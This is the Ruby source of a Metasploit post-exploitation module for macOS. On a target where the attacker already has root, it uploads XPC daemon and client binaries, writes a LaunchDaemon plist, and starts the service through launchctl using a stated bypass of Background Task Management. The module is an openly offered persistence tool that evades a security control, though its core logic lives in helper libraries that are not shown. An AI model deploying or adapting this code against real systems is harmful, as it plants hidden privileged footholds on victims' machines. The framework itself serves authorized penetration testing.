##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require_relative '../../lib/xpc_helper'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::OSX::Priv
  include Msf::Post::OSX::XPCDaemon

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'         => 'macOS XPC Daemon Install',
        'Description'  => %q{
          Deploys and installs a privileged XPC daemon on a macOS target.
          Uploads pre-compiled universal binaries (daemon and client), writes
          a LaunchDaemon plist, and bootstraps the service via launchctl with
          a BTM (Background Task Management) bypass. Requires root privileges.
        },
        'License'      => MSF_LICENSE,
        'Author'       => ['Mr.Gedik'],
        'Platform'     => ['osx'],
        'SessionTypes' => ['shell', 'meterpreter']
      )
    )

    register_options([
      # Default: framework root (binaries under build/) — modules/post/osx/manage is 5 levels down
      OptString.new('DATA_DIR', [true, 'Path to directory containing compiled XPC binaries',
        ::File.expand_path('../../../../../', __dir__)]),
    ])
  end

  def run
    unless is_root?
      fail_with(Failure::NoAccess, 'Root privileges are required to install the XPC daemon')
    end

    data_dir = datastore['DATA_DIR']
    print_status("Deploying XPC daemon from #{data_dir}...")

    unless xpc_deploy(data_dir)
      fail_with(Failure::Unknown, 'Daemon deployment failed')
    end

    print_status('Verifying daemon installation...')
    info = xpc_exec!('i')

    if info
      xpc_print_table('XPC Daemon Info', info)
      print_good('XPC daemon installed and running successfully')
    else
      print_warning('Daemon is running but info query returned no data')
    end
  end
end
